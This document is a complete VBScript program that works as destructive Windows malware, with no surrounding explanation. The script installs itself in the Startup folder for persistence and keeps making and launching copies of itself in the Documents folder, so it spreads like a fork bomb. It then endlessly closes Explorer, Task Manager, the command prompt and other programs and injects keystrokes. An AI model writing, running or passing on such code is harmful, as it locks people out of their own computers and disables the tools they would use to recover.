Set WshShell = WScript.CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")

' Add script to Startup folder
strStartupPath = WshShell.SpecialFolders("Startup")
Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\RunCopies.vbs.lnk")
objShellLink.TargetPath = WScript.ScriptFullName
objShellLink.Save

For i = 1 To 10
    ' Copy script to Documents folder and run the copy
    strDocumentsPath = WshShell.SpecialFolders("MyDocuments")
    fso.CopyFile WScript.ScriptFullName, strDocumentsPath & "\" & "Copy" & i & ".vbs", True
    WshShell.Run strDocumentsPath & "\" & "Copy" & i & ".vbs", 1, False
Next

Do
    For Each strExeName In strExeNames
        Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
        Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = '" & strExeName & "'")
        
        If colProcessList.Count > 0 Then
            For Each objProcess In colProcessList
                WshShell.AppActivate objProcess.ProcessId
                WScript.Sleep 0 'wait for window to activate before closing
                WshShell.SendKeys "%{F4}" 'sends Alt+F4 to close window
            Next
        End If
    Next
    
    'Type "n" into search bar with focus
    WshShell.SendKeys "n"
    
    WScript.Sleep 0 'wait before checking again
Loop
